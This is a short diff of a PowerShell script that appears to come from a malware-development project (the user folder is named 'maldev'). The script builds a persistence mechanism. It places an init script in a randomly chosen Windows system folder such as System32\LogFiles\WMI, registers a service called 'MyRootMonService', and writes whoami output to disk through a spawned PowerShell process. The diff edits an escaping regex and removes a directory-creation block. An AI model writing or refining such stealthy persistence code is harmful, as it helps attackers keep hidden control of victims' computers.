@@ -10,7 +10,7 @@ $paths = @(
     "$env:windir\System32\LogFiles\WMI"
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
-$b = $basePath -replace '([{}])', '`$1'
+$b = $basePath -replace '([\\{}])', '`$1'
 echo $basePath >> "C:\Users\maldev\Downloads\root_mon_mon.txt"
 
 $serviceName = "MyRootMonService"
@@ -22,9 +22,9 @@ $initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)
 $initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"
 $rootMonScript = ""
 
-if(-not(Test-Path -Path $basePath)){
-    New-Item -Path $basePath -Force
-}
+
+
+
 
 $item = Get-ItemProperty -Path "$basePath" -Name $propertyName 
 if(-not($item)){
